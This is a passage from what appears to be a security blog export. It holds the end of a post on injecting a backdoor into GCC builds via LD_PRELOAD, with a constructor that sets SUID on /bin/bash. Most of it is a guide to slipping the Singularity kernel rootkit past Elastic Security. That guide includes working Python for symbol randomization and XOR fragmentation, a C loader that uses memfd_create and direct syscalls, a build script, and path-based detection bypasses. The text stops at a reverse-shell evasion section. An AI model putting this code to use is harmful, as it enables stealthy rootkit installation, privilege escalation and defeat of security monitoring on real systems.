free(new_argv); return result; } } return real_posix_spawn(pid, path, file_actions, attrp, argv, envp); } This hook ensures that even when gcc or ld use posix_spawn internally, the malicious library will still be injected. It is a layer of compatibility that makes the our malware even more effective.\nThe entire mechanism is activated when the library compiled with this main.c is loaded via LD_PRELOAD, a legitimate Linux feature used to replace functions from standard libraries. Any compilation performed on the system can be automatically compromised.\nMalicious code: b.c The purpose of the b.c code is to modify the permissions of /bin/bash to allow it to be executed with elevated privileges.\n#include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; __attribute__((constructor)) void backdoor() { chmod(\u0026#34;/bin/bash\u0026#34;, 04755); } In other words, as soon as some code is compiled using GCC, for example, it will inject our backdoor inside, and if executed as root, it will set the SUID on /bin/bash.\nPOC Conclusion With this simple hook, we’re able to intercept GCC’s compilation pipeline and inject a malicious library during the linking stage, all without modifying the source code.\nThe result is a seemingly legitimate binary that silently carries a hidden payload, ready to be executed.\nPlease feel free to contact me on Twitter if you have any questions.\nRootkit Researchers\n","permalink":"http://localhost:1313/hacking/gcc/","summary":"\u003ch1 id=\"hijacking-gcc-with-ld_preload\"\u003eHijacking GCC with LD_PRELOAD\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/MmPbrjL.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIf you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries \u003cstrong\u003ewithout touching the source code\u003c/strong\u003e, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during \u003cstrong\u003elinking\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\u003c/p\u003e","title":"ElfDoor-gcc"},{"content":" Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nIntroduction Security solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\nThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\nTable of Contents Introduction Understanding the Threat Landscape: Elastic YARA Rules Primary Detection Rules Detection Signature Analysis The Singularity Rootkit: Capabilities Overview Core Features Evasion Technique 1: Symbol Name Randomization The Problem The Solution: Intelligent Name Randomization Evasion Technique 2: Module Fragmentation The Problem The Solution: Fragment + XOR Encoding + In-Memory Loading Custom Loader via memfd_create Evasion Technique 3: Ftrace Helper Obfuscation The Problem The Solution: Rename Ftrace Framework Functions Build Pipeline: Automated Obfuscation Workflow Final Test: Successful Evasion Bonus: Compilation Path Detection Bypass Bonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells Conclusion Understanding the Threat Landscape: Elastic YARA Rules In a default environment with the Elastic agent installed, attempting to compile and load the Singularity rootkit results in immediate detection and files removed. The kernel object is automatically deleted and isolated in quarantine before it can be loaded into the kernel.\nThere were approximately 26 detections.\nUpon investigation, I identified the specific Elastic YARA rules detecting our rootkit:\nPrimary Detection Rules Linux_Rootkit_BrokePKG.yar\nLinux_Rootkit_Generic.yar\nLinux_Rootkit_Generic_61229bdf - Detects common rootkit patterns and function names Linux_Rootkit_Generic_482bca48 - Targets suspicious prefixes and hook patterns Linux_Rootkit_Generic_d0c5cfe0 - Detects initialization and hooking combinations Linux_Rootkit_Generic_f07bcabe - Identifies ftrace helper functions Linux_Rootkit_Generic_5d17781b - Targets license strings combined with kallsyms Linux_Rootkit_BrokePKG_7b7d4581 - Specific patterns from known rootkits Detection Signature Analysis Generic Rootkit Detection (61229bdf) Targets: hide_module, hook_getdents, orig_kill, fake_tcp4_seq_show, etc. Condition: 4 or more matching strings Total patterns: 57 distinct function names Hook Pattern Detection (482bca48) System strings: sys_call_table, kallsyms_lookup_name, kprobe Rootkit prefixes: rootkit, hide_, hacked_, fake_, hooked_ Hook suffixes: _getdents, _kill, _tcp4_seq_show, _udp4_seq_show Condition: 3 system strings AND (all prefixes OR 3 prefixes + 5 hooks) License String Detection (5d17781b) Targets: kallsyms_lookup_name_t + \u0026#34;license=GPL\u0026#34; Condition: Both strings must be present Purpose: Detects ftrace-based rootkits using kallsyms Ftrace Helper Detection (f07bcabe) Targets: - fh_install_hook - fh_remove_hook - fh_resolve_hook_address Condition: 2 or more matching strings BrokePKG Specific Detection (7b7d4581) License strings: - author=R3tr074 - name=brokepkg - description=Rootkit - license=GPL Specific strings: - brokepkg - brokepkg: module revealed - br0k3_n0w_h1dd3n Hook patterns: - nf_inet_hooks - ftrace_hook - hook_getdents - hook_kill - orig_tcp4_seq_show Condition: 3 license strings OR 2 specific strings OR 4 hook patterns Since our rootkit utilizes ftrace for syscall hooking, it naturally contains many of these patterns. The challenge becomes: how do we maintain functionality while evading static signature detection?\nThe Singularity Rootkit: Capabilities Overview Source: https://github.com/MatheuZSecurity/Singularity\nBefore diving into evasion techniques, let\u0026rsquo;s understand what the Singularity rootkit accomplishes:\nCore Features Process Hiding: Hides processes from /proc. File and Directory Hiding: Conceals files matching specific patterns (singularity, obliviate, matheuz, zer0t, etc.) Network Hiding: Hides TCP connections on port 8081 from netstat and packet capture tools Privilege Escalation: Provides root access via signal 59 (kill -59 ) or environment variable (MAGIC=mtz) ICMP Backdoor: Triggers reverse shell via magic ICMP packets (sequence 1337) Anti-Analysis Features:\nBlocks BPF programs and tracing Prevents ftrace manipulation by other users Disables module loading via init_module/finit_module hooks Filters /proc/kallsyms, /proc/modules, and tracefs Taint Clearing: Resets kernel taint flags to hide unsigned module loading Log Sanitization: Filters kernel logs (dmesg, /var/log/kern.log) to remove traces of the rootkit Module Stealth: Self-hiding from lsmod and /sys/module directory Evasion Technique 1: Symbol Name Randomization The Problem Rootkits typically use predictable naming patterns that become signatures:\nhook_getdents64 fake_tcp4_seq_show hide_module orig_kill hacked_open hooked_read Elastic\u0026rsquo;s YARA rules (61229bdf, 482bca48, d0c5cfe0) specifically target these prefixes:\n$rk1 = \u0026#34;rootkit\u0026#34; $rk2 = \u0026#34;hide_\u0026#34; $rk3 = \u0026#34;hacked_\u0026#34; $rk4 = \u0026#34;fake_\u0026#34; $rk5 = \u0026#34;hooked_\u0026#34; $hook1 = \u0026#34;_getdents\u0026#34; $hook2 = \u0026#34;_kill\u0026#34; $hook3 = \u0026#34;_tcp4_seq_show\u0026#34; The Solution: Intelligent Name Randomization Our Python obfuscator generates kernel-like generic names that blend in with legitimate kernel code:\ndef _generate_random_name(self) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Generates random name that avoids YARA patterns\u0026#34;\u0026#34;\u0026#34; # Avoid suspicious prefixes: hook_, fake_, hide_, hacked_, hooked_, orig_ # Use generic names that look legitimate prefixes = [\u0026#39;sys\u0026#39;, \u0026#39;kern\u0026#39;, \u0026#39;dev\u0026#39;, \u0026#39;mm\u0026#39;, \u0026#39;fs\u0026#39;, \u0026#39;net\u0026#39;, \u0026#39;proc\u0026#39;, \u0026#39;sched\u0026#39;] suffixes = [\u0026#39;handler\u0026#39;, \u0026#39;helper\u0026#39;, \u0026#39;worker\u0026#39;, \u0026#39;ops\u0026#39;, \u0026#39;func\u0026#39;, \u0026#39;entry\u0026#39;, \u0026#39;cb\u0026#39;] prefix = random.choice(prefixes) suffix = random.choice(suffixes) middle = \u0026#39;\u0026#39;.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) return f\u0026#34;{prefix}_{middle}_{suffix}\u0026#34; Key Features No suspicious prefixes (hook_, fake_, hide_) Looks like legitimate kernel code Maintains internal consistency via mapping file Protects kernel API calls from renaming Protected Names The obfuscator maintains a whitelist of kernel API functions that must NOT be renamed:\ndef _get_protected_names(self) -\u0026gt; Set[str]: \u0026#34;\u0026#34;\u0026#34;Names from kernel that should NOT be changed\u0026#34;\u0026#34;\u0026#34; return { # Basic C types \u0026#39;int\u0026#39;, \u0026#39;void\u0026#39;, \u0026#39;long\u0026#39;, \u0026#39;char\u0026#39;, \u0026#39;size_t\u0026#39;, \u0026#39;ssize_t\u0026#39;, # Essentials \u0026#39;module_init\u0026#39;, \u0026#39;module_exit\u0026#39;, \u0026#39;THIS_MODULE\u0026#39;, \u0026#39;current\u0026#39;, \u0026#39;kmalloc\u0026#39;, \u0026#39;kfree\u0026#39;, \u0026#39;printk\u0026#39;, \u0026#39;pr_debug\u0026#39;, \u0026#39;copy_from_user\u0026#39;, \u0026#39;copy_to_user\u0026#39;, \u0026#39;fget\u0026#39;, \u0026#39;fput\u0026#39;, \u0026#39;kernel_read\u0026#39;, # Structures \u0026#39;pt_regs\u0026#39;, \u0026#39;file\u0026#39;, \u0026#39;task_struct\u0026#39;, \u0026#39;sk_buff\u0026#39;, # Entry points \u0026#39;main\u0026#39;, \u0026#39;init\u0026#39;, \u0026#39;exit\u0026#39;, } Function Name Extraction The obfuscator scans source files for function definitions using multiple regex patterns:\nself.function_patterns = [ r\u0026#39;\\bnotrace\\s+(?:static\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+(?:notrace\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+asmlinkage\\s+\\w+\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\basmlinkage\\s+\\w+\\s+\\*?\\(?\\*?(\\w+)\\)?\u0026#39;, r\u0026#39;\\b(\\w+_init)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\b(\\w+_exit)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\bHOOK\\s*\\([^,]+,\\s*(\\w+)\\s*,\u0026#39;, r\u0026#39;\\btypedef\\s+[^;]+\\s+(\\w+_t)\\s*;\u0026#39;, ] Example Transformation Before:\n// modules/hiding_directory.c static notrace long hook_getdents64(const struct pt_regs *regs) { long res = orig_getdents64(regs); // ... } static notrace long hook_getdents(const struct pt_regs *regs) { long res = orig_getdents(regs); // ... } After:\n// obfuscated/modules/hiding_directory.c static notrace long sys_abjker_handler(const struct pt_regs *regs) { long res = kern_wopqls_helper(regs); // ... } static notrace long fs_tnmqlk_ops(const struct pt_regs *regs) { long res = net_xzpnrm_func(regs); // ... } Implementation Details def _replace_in_content(self, content: str, mapping: Dict[str, str]) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Replace names in content\u0026#34;\u0026#34;\u0026#34; modified = content # Sort by descending length to avoid partial substitutions sorted_items = sorted(mapping.items(), key=lambda x: len(x[0]), reverse=True) for old_name, new_name in sorted_items: # Use word boundary for exact substitution pattern = r\u0026#39;\\b\u0026#39; + re.escape(old_name) + r\u0026#39;\\b\u0026#39; modified = re.sub(pattern, new_name, modified) return modified The key insight: we sort by length descending to prevent partial matches. For example, if we have both hook_kill and hook_kill_ex, we must replace hook_kill_ex first to avoid breaking it into sys_abc_handler_ex.\nEvasion Technique 2: Module Fragmentation The Problem EDR solutions scan loaded kernel modules primarily on disk. A monolithic .ko file presents a single attack surface that\u0026rsquo;s easy to analyze:\nSignature scanning of the entire module on disk Static analysis of ELF structure Symbol table enumeration String pattern detection (including \u0026ldquo;GPL\u0026rdquo;, \u0026ldquo;kallsyms_lookup_name\u0026rdquo;, etc.) The Solution: Fragment + XOR Encoding + Ephemeral In-Memory Loading We split the compiled module into encrypted chunks that are only reassembled in memory during loading. This technique breaks static disk-based analysis while maintaining functionality.\nHow This Evades Detection The evasion works through a multi-layered approach:\nDisk-Based YARA Evasion: XOR encoding breaks string signatures in stored fragments Ephemeral Reconstruction: The complete module exists in plaintext only briefly in a temporary memfd Self-Hiding Post-Load: The rootkit immediately conceals itself after loading Important Technical Note: After XOR decoding during the load process, strings like \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo; are restored to plaintext in memory. However, Elastic\u0026rsquo;s YARA rules primarily scan files on disk, not ephemeral memory structures. The combination of:\nXOR-encoded fragments on disk (unreadable to YARA) Millisecond-duration plaintext in anonymous memfd (difficult to scan) Immediate self-hiding after module load (invisible to subsequent analysis) \u0026hellip;creates an effective evasion without requiring permanent string obfuscation in memory.\nFragmentation Pipeline: def fragment(self, chunk_size: int = 65536, encode: bool = True) -\u0026gt; List[bytes]: \u0026#34;\u0026#34;\u0026#34; Fragment the .ko into chunks Args: chunk_size: Size of each fragment (default: 64KB) encode: If True, apply XOR encoding Returns: List of fragments \u0026#34;\u0026#34;\u0026#34; print(f\u0026#34;\\n[*] Fragmenting: {self.ko_path}\u0026#34;) print(f\u0026#34; Chunk size: {chunk_size} bytes\u0026#34;) # Read the .ko file with open(self.ko_path, \u0026#39;rb\u0026#39;) as f: ko_data = f.read() original_size = len(ko_data) print(f\u0026#34;[+] Original size: {original_size} bytes\u0026#34;) # Generate random XOR key xor_key = os.urandom(16) if encode else b\u0026#39;\\x00\u0026#39; * 16 # Fragment fragments = [] num_chunks = (original_size + chunk_size - 1) // chunk_size for i in range(num_chunks): start = i * chunk_size end = min(start + chunk_size, original_size) chunk = ko_data[start:end] # Apply encoding if necessary if encode: chunk = self._xor_encode(chunk, xor_key) fragments.append(chunk) checksum = self._calculate_checksum(chunk) print(f\u0026#34;[+] Fragment {i+1}/{num_chunks}: {len(chunk)} bytes (SHA256: {checksum[:16]}...)\u0026#34;) self.fragments = fragments # Metadata self.metadata = { \u0026#39;original_filename\u0026#39;: self.ko_path.name, \u0026#39;original_size\u0026#39;: original_size, \u0026#39;num_fragments\u0026#39;: len(fragments), \u0026#39;chunk_size\u0026#39;: chunk_size, \u0026#39;encoded\u0026#39;: encode, \u0026#39;xor_key\u0026#39;: xor_key.hex() if encode else None, \u0026#39;checksums\u0026#39;: [self._calculate_checksum(f) for f in fragments] } return fragments XOR Encoding We use a simple but effective XOR cipher with a random 16-byte key:\ndef _xor_encode(self, data: bytes, key: bytes) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Simple XOR encoding for obfuscation\u0026#34;\u0026#34;\u0026#34; encoded = bytearray() key_len = len(key) for i, byte in enumerate(data): encoded.append(byte ^ key[i % key_len]) return bytes(encoded) While XOR is cryptographically weak, it serves our purpose for disk-based evasion:\nBreaks signature matching in files stored on disk Fast to encode/decode Minimal overhead Easy to implement in C loader Evasion Layer Breakdown ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 1: Fragments on Disk (XOR Encoded) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: YARA cannot detect signatures │ │ Reason: All bytes are XOR\u0026#39;ed, \u0026#34;GPL\u0026#34; appears as random bytes │ │ │ │ # Before encoding │ │ strings singularity.ko | grep \u0026#34;GPL\u0026#34; │ │ license=GPL │ │ │ │ # After encoding │ │ strings fragments/chunk_000.bin | grep \u0026#34;GPL\u0026#34; │ │ (no results - bytes are obfuscated) │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 2: Ephemeral memfd (Plaintext - Milliseconds) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings are restored to plaintext │ │ Reason: XOR decode happens during reconstruction │ │ │ │ Timeline: │ │ T+0ms: memfd created │ │ T+5ms: fragments decoded and written │ │ T+10ms: finit_module() called │ │ T+15ms: memfd closed and deleted │ │ │ │ Detection Window: ~15 milliseconds │ │ Elastic Challenge: Must scan anonymous memfd in real-time │ └─────────────────────────────────────────────────────────────────┘ ┌─────────────────────────────────────────────────────────────────┐ │ LAYER 3: Loaded Module (Plaintext but Hidden) │ ├─────────────────────────────────────────────────────────────────┤ │ Status: Strings exist in kernel memory │ │ Reason: Module is loaded normally │ │ │ │ Rootkit Self-Hiding: │ │ ✓ Hidden from lsmod │ │ ✓ Hidden from /sys/module │ │ ✓ Filters /proc/kallsyms │ │ ✓ Filters /proc/modules │ │ ✓ Blocks BPF and tracing │ │ │ │ Result: Invisible to analysis tools │ └─────────────────────────────────────────────────────────────────┘ Why Elastic Doesn\u0026rsquo;t Detect This YARA primarily scans disk files\nFragments are XOR\u0026rsquo;ed and broken up No single file contains the complete signature pattern Original .ko is deleted after fragmentation memfd is ephemeral and anonymous\nExists for ~15 milliseconds during loading No persistent path in filesystem Difficult to scan in real-time Post-load self-hiding\nModule immediately conceals itself Blocks subsequent inspection attempts Filtering prevents memory analysis Resulting Structure fragments/ ├── chunk_000.bin # XOR-encoded fragment (64KB) ├── chunk_001.bin # XOR-encoded fragment (64KB) ├── chunk_002.bin # XOR-encoded fragment (64KB) ├── ... ├── chunk_N.bin # Final fragment (variable size) ├── metadata.json # Contains XOR key and checksums └── reconstruct.sh # Automated reconstruction script Metadata Format { \u0026#34;original_filename\u0026#34;: \u0026#34;singularity.ko\u0026#34;, \u0026#34;original_size\u0026#34;: 245632, \u0026#34;num_fragments\u0026#34;: 4, \u0026#34;chunk_size\u0026#34;: 65536, \u0026#34;encoded\u0026#34;: true, \u0026#34;xor_key\u0026#34;: \u0026#34;a3f5b2c8e1d4f7a6b9c2e5f8a1d4b7c0\u0026#34;, \u0026#34;checksums\u0026#34;: [ \u0026#34;e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\u0026#34;, \u0026#34;cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce\u0026#34;, \u0026#34;2c26b46b68ffc68ff99b453c1d30413413422d706483bfa0f98a5e886266e7ae\u0026#34;, \u0026#34;fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9\u0026#34; ] } Custom Loader via memfd_create Instead of using insmod or modprobe, we implement a custom loader that:\nReads encrypted fragments from disk Decodes them in memory Creates an anonymous memory file descriptor Writes the reconstructed module to the memory FD Loads the module via direct syscall Immediately closes the memfd (auto-deleted) Loader Architecture /* * Singularity Loader * * 1. Uses 32-bit syscall (finit_module) via inline assembly * 2. Reconstructs .ko from fragments in memory * 3. Decodes XOR encoding (strings restored to plaintext) * 4. Uses memfd_create for ephemeral loading * 5. Direct syscall to avoid libc wrapper * 6. memfd exists only during loading (~15ms) * * Compile: gcc -o loader loader.c -static * Usage: ./loader fragments/ */ #define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; // Syscall numbers #define __NR_finit_module 313 #define __NR_memfd_create 319 // Settings #define MAX_FRAGMENTS 256 #define MAX_CHUNK_SIZE (1024 * 1024) // 1MB #define XOR_KEY_SIZE 16 #define MODULE_FLAGS 0 Direct Syscall Implementation To avoid EDR hooking of libc functions, we use inline assembly for direct syscalls:\n// Direct 64-bit syscall static inline long syscall_direct_64(long number, long arg1, long arg2, long arg3) { long ret; register long r10 asm(\u0026#34;r10\u0026#34;) = arg3; asm volatile( \u0026#34;syscall\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;D\u0026#34; (arg1), \u0026#34;S\u0026#34; (arg2), \u0026#34;d\u0026#34; (r10) : \u0026#34;rcx\u0026#34;, \u0026#34;r11\u0026#34;, \u0026#34;memory\u0026#34; ); return ret; } // Direct 32-bit syscall static inline long syscall_direct_32(long number, long arg1, long arg2, long arg3) { long ret; asm volatile( \u0026#34;int $0x80\u0026#34; : \u0026#34;=a\u0026#34; (ret) : \u0026#34;0\u0026#34; (number), \u0026#34;b\u0026#34; (arg1), \u0026#34;c\u0026#34; (arg2), \u0026#34;d\u0026#34; (arg3) : \u0026#34;memory\u0026#34; ); return ret; } Why This Works:\n32-bit Syscall: The int $0x80 interface is legacy and less monitored than modern syscall instruction Memory File Descriptor Creation static int create_memfd(const char *name) { long fd = syscall_direct_64(__NR_memfd_create, (long)name, 0, 0); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] memfd_create failed: %s\\n\u0026#34;, strerror(-fd)); return -1; } printf(\u0026#34;[+] memfd created: fd=%ld (%s)\\n\u0026#34;, fd, name); return (int)fd; } memfd_create creates an anonymous file that:\nExists only in memory (tmpfs) Automatically deleted when all file descriptors are closed Can be passed to finit_module() like a regular file Contains plaintext .ko after XOR decode (but only temporarily) Remember that EDRs can monitor memfd_create() calls, and it can also be detected in /proc/\u0026lt;pid\u0026gt;/fd/ during the brief loading window.\nXOR Decoder static void xor_decode(uint8_t *data, size_t len, const uint8_t *key, size_t key_len) { for (size_t i = 0; i \u0026lt; len; i++) { data[i] ^= key[i % key_len]; } } Critical Note: This decode operation restores all strings to plaintext, including \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo;. The evasion relies on the ephemeral nature of this plaintext state, not permanent obfuscation.\nFragment Loading static int load_fragments(const char *dir_path, Fragment *fragments, int *num_fragments) { DIR *dir = opendir(dir_path); if (!dir) { perror(\u0026#34;[!] opendir\u0026#34;); return -1; } struct dirent *entry; int count = 0; printf(\u0026#34;[*] Scanning fragments in: %s\\n\u0026#34;, dir_path); while ((entry = readdir(dir)) != NULL \u0026amp;\u0026amp; count \u0026lt; MAX_FRAGMENTS) { // Look for chunk_XXX.bin if (strncmp(entry-\u0026gt;d_name, \u0026#34;chunk_\u0026#34;, 6) == 0 \u0026amp;\u0026amp; strstr(entry-\u0026gt;d_name, \u0026#34;.bin\u0026#34;) != NULL) { char filepath[512]; snprintf(filepath, sizeof(filepath), \u0026#34;%s/%s\u0026#34;, dir_path, entry-\u0026gt;d_name); // Extract index int idx = atoi(entry-\u0026gt;d_name + 6); // Read fragment FILE *f = fopen(filepath, \u0026#34;rb\u0026#34;); if (!f) { fprintf(stderr, \u0026#34;[!] Error opening %s\\n\u0026#34;, filepath); continue; } fseek(f, 0, SEEK_END); long fsize = ftell(f); fseek(f, 0, SEEK_SET); uint8_t *data = malloc(fsize); if (!data) { fclose(f); continue; } size_t read_bytes = fread(data, 1, fsize, f); fclose(f); if (read_bytes != fsize) { free(data); continue; } fragments[count].data = data; fragments[count].size = fsize; fragments[count].index = idx; count++; printf(\u0026#34;[+] Fragment %d: %s (%ld bytes)\\n\u0026#34;, idx, entry-\u0026gt;d_name, fsize); } } closedir(dir); *num_fragments = count; // Sort fragments by index for (int i = 0; i \u0026lt; count - 1; i++) { for (int j = 0; j \u0026lt; count - i - 1; j++) { if (fragments[j].index \u0026gt; fragments[j + 1].index) { Fragment temp = fragments[j]; fragments[j] = fragments[j + 1]; fragments[j + 1] = temp; } } } return 0; } Module Loading static int load_module_stealthy(int fd, const char *params, int flags) { printf(\u0026#34;[*] Loading module via direct syscall...\\n\u0026#34;); // Try 32-bit syscall first (more stealthy) long ret = syscall_direct_32(__NR_finit_module, fd, (long)params, flags); if (ret \u0026lt; 0) { // Fallback to 64-bit ret = syscall_direct_64(__NR_finit_module, fd, (long)params, flags); } if (ret \u0026lt; 0) { fprintf(stderr, \u0026#34;[!] finit_module failed: %s\\n\u0026#34;, strerror(-ret)); return -1; } printf(\u0026#34;[+] Module loaded successfully!\\n\u0026#34;); return 0; } Complete Loading Workflow int main(int argc, char *argv[]) { // 1. Load fragments Fragment fragments[MAX_FRAGMENTS] = {0}; int num_fragments = 0; load_fragments(fragments_dir, fragments, \u0026amp;num_fragments); // 2. Parse metadata (get XOR key) uint8_t xor_key[XOR_KEY_SIZE] = {0}; int is_encoded = 0; parse_metadata(fragments_dir, xor_key, \u0026amp;is_encoded); // 3. Create memfd (anonymous, temporary) int memfd = create_memfd(\u0026#34;module\u0026#34;); // 4. Reconstruct module in memfd // IMPORTANT: After this step, strings are in PLAINTEXT in memfd for (int i = 0; i \u0026lt; num_fragments; i++) { uint8_t *data = fragments[i].data; size_t size = fragments[i].size; // Decode if necessary (restores plaintext) if (is_encoded) { xor_decode(data, size, xor_key, XOR_KEY_SIZE); } // Write to memfd (plaintext .ko now in memory) write(memfd, data, size); } // Reset FD position lseek(memfd, 0, SEEK_SET); // 5. Load module via direct syscall // Plaintext .ko exists in memfd for ~15ms during this call load_module_stealthy(memfd, module_params, MODULE_FLAGS); // 6. Cleanup (memfd automatically deleted) // After this, the only plaintext copy is in kernel memory // where the rootkit\u0026#39;s self-hiding protects it close(memfd); return 0; } Advantages of This Approach:\nNo .ko file on disk after compilation Fragments can be deleted after loading Plaintext .ko exists only in ephemeral memfd (~15ms window) Post-load self-hiding prevents subsequent analysis Static Analysis Resistance:\nIndividual fragments don\u0026rsquo;t match YARA signatures (XOR\u0026rsquo;ed) No complete ELF structure visible on disk Plaintext reconstruction happens in anonymous, temporary memfd Loaded module immediately hides itself from inspection tools Detection Challenges for EDR:\nMust scan ephemeral memfd in real-time (15ms window) Must bypass rootkit\u0026rsquo;s anti-analysis features post-load Disk-based YARA scanning ineffective against XOR\u0026rsquo;ed fragments Evasion Technique 3: Ftrace Helper Obfuscation The Problem Elastic\u0026rsquo;s rule f07bcabe targets ftrace-based rootkits by detecting function names:\n$str1 = \u0026#34;fh_install_hook\u0026#34; $str2 = \u0026#34;fh_remove_hook\u0026#34; $str3 = \u0026#34;fh_resolve_hook_address\u0026#34; Condition: 2 of them These are standard function names in ftrace hooking frameworks, making them easy signatures.\nThe Solution: Rename Ftrace Framework Functions Our obfuscator treats ftrace helper functions like any other custom function:\nBefore:\n// ftrace/ftrace_helper.c notrace int fh_resolve_hook_address(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int fh_install_hook(struct ftrace_hook *hook) { int err = fh_resolve_hook_address(hook); // ... } notrace void fh_remove_hook(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fh_install_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = fh_install_hook(\u0026amp;hooks[i]); // ... } } notrace void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) fh_remove_hook(\u0026amp;hooks[i]); } Example after Obfuscation:\n// obfuscated/ftrace/ftrace_helper.c notrace int kern_xploqm_helper(struct ftrace_hook *hook) { hook-\u0026gt;address = kallsyms_lookup_name(hook-\u0026gt;name); // ... } notrace int sys_zmnpqr_ops(struct ftrace_hook *hook) { int err = kern_xploqm_helper(hook); // ... } notrace void net_abqzpx_handler(struct ftrace_hook *hook) { int err = unregister_ftrace_function(\u0026amp;hook-\u0026gt;ops); // ... } notrace int fs_klmnop_worker(struct ftrace_hook *hooks, size_t count) { size_t i; int err; for (i = 0; i \u0026lt; count; i++) { err = sys_zmnpqr_ops(\u0026amp;hooks[i]); // ... } } notrace void proc_qwerty_entry(struct ftrace_hook *hooks, size_t count) { size_t i; for (i = 0; i \u0026lt; count; i++) net_abqzpx_handler(\u0026amp;hooks[i]); } The obfuscated names maintain the ftrace hooking functionality while breaking the specific signature patterns that Elastic Security looks for. The functions remain fully operational since the kernel doesn\u0026rsquo;t care about function names in loaded modules.\nBuild Pipeline: Automated Obfuscation Workflow Our automated build system chains all evasion techniques in a reproducible pipeline:\n#!/bin/bash set -e echo \u0026#34;[*] Singularity Build\u0026#34; rm -rf obfuscated fragments loader singularity_payload* # 1. Obfuscate and compile echo \u0026#34;[1] Obfuscating and compiling...\u0026#34; python3 obfuscator/name_randomizer.py --input . --output obfuscated cd obfuscated \u0026amp;\u0026amp; make \u0026amp;\u0026amp; cd .. # 2. Fragment the .ko echo \u0026#34;[2] Fragmenting module...\u0026#34; python3 obfuscator/ko_fragmenter.py --input obfuscated/singularity.ko --output fragments # 3. CLEANUP - Remove obfuscated directory completely echo \u0026#34;[4] Cleaning build artifacts...\u0026#34; rm -rf obfuscated echo \u0026#34;[+] Build complete! Final files:\u0026#34; echo \u0026#34; - fragments/ (module fragments)\u0026#34; echo \u0026#34; - loader\u0026#34; echo \u0026#34; - NO obfuscated code left behind\u0026#34; Final Test: Successful Evasion In the screenshot we run the build.sh and we can see the saved kernel module fragments and all obfuscated.\nNow, using the loader, we can load Singularity without being detected.\nTesting one of singularity features hiding our process and become root.\nWith these techniques, we successfully bypass Elastic Security\u0026rsquo;s static detection mechanisms.\nBonus: Compilation Path Detection Bypass By default, Elastic Security actively monitors compilation activity in /dev/shm and automatically terminates the process when it detects suspicious operations like compiling loader.c or the Singularity rootkit.\nSimple Evasion Technique:\nThis detection can be easily bypassed by compiling in alternative directories that are less monitored:\n# Instead of /dev/shm (monitored): gcc -o /dev/shm/loader loader.c # Detected and killed # Use alternative paths (less scrutinized): gcc -o /tmp/loader loader.c # Bypasses detection gcc -o /var/tmp/loader loader.c # Bypasses detection Why This Works:\nElastic\u0026rsquo;s behavioral detection rules prioritize monitoring /dev/shm due to its common use in malware. Alternative writable directories like /tmp and /var/tmp receive less aggressive monitoring, allowing the compilation and execution of the loader without triggering automated termination.\nBonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells The latest version of Singularity triggers a reverse shell via ICMP packet hooking. While the previous techniques bypassed static YARA signatures, Elastic\u0026rsquo;s behavioral detection rules caught the reverse shell execution.\nThe Detection Problem Elastic triggered two behavioral 